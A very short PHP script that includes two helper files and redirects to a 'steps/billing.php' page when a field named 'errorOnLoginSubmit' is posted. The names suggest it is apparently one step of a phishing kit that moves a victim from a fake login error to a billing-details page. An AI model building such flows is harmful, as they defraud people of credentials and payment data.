<?php

include('../infos.php');
include("../common/sub_includes.php");

if(isset($_POST["errorOnLoginSubmit"])){
    header('Location: ../steps/billing.php');
}